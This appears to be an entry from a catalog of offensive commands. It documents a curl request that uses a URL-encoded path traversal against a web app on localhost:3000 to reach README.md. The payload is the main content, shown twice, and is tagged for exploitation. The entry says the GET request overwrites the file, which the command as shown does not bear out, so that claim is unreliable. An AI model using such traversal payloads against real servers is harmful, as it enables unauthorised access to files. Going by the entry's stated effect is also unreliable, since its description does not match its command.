---
data: 'curl "http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fREADME%2emd"'
tags:
  - exploitation
  - overwrite
type: command
output: 'HTTP response, README.md overwritten'
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:27.361Z'
id: f100ff73-d243-4e6e-b420-e718f0d905a0
verified: false
validated: true
submitted: true
---
# curl-traversal-overwrite

## Command

```bash
curl "http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fREADME%2emd"
```

## Description

Overwrites README.md via traversal.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Encoded URL | Target file path | Yes |

## Examples

### Basic Usage

```bash
curl "http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fREADME%2emd"
```

## Expected Output

File overwritten.

## Related

- [[commands/cat-readme-file]]
